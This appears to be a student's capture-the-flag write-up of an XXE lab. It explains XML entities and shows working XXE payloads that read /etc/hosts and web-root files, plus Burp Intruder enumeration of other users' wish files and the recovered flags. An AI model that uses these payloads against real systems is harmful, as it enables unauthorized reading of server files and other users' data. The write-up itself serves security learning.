# Day 5 : SOC-mas XX-what-ee?

## Learning Objectives

- Understand the basic concepts related to XML
- Explore XML External Entity (XXE) and its components
- Learn how to exploit the vulnerability
- Understand remediation measures

## Terminologies

`XML` is a commonly used method to transport and store data in a structured format that humans and machines can easily understand. You can think of XML as a `digital filing cabinet`. Just as a filing cabinet has folders with labelled documents inside,`XML uses tags to label and organise information`.

`DTD` is a set of rules that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file.

`Entities` in XML are `placeholders` that allow the `insertion of large chunks of data or referencing internal or external files`. They assist in making the XML file easy to manage, especially when the same data is repeated multiple times. 

`XXE is an attack that takes advantage of how XML parsers handle external entities`. When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to.

## Approach 

We open the link on BurpSuite and intercept it. I found 3 items and then added one of them to cart.

Now when I opened the cart and proceeded to checkout. It asked for a name and address and I gave a random one.

At the end of that it said our wish has been saved as wish#21 which was a link but we get an error message.

![alt text](./Images/Day5.png)

Now the 2nd request, i.e the Wishlist one had the XML structure in it so that's one place where I should look for. 

![alt text](./Images/Day-5(1).png)

Then I inputted the given payload :

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>   // Defining an XML document, defining external entity called payload and we're reading the /etc/host file (which resolves IPs to domains - remote filereading)
<wishlist>                                                
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

Now Web Servers onn Linux have a common location like `var/www/html`.

So our new payload is :

```
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_21.txt"> ]>   // Defining an XML document, defining external entity called payload and we're reading the /etc/host file (which resolves IPs to domains - remote filereading)
<wishlist>                                                
  <user_id>1</user_id>
     <item>
       <product_id>&payload;</product_id>
     </item>
</wishlist>
```

![alt text](./Images/Day5(2).png)

Now instead of wish_21 if I put wish_1 or something like that, I could read other's wishes.

Then I opened intruder. The wish I sent was wish_1.txt and did the following

![alt text](./Images/Day5(3).png)

This gave me multiple requests and their responses, I found the flag in `wish_15.txt`

`Flag : THM{Brut3f0rc1n6_mY_w4y}`

There is even a changelog at this IP and we find another flag over there.

![alt text](./Images/Day5(4).png)
 `Flag : THM{m4y0r_m4lw4r3_b4ckd00rs}`

 ![alt text](./Images/Day5(6).png)
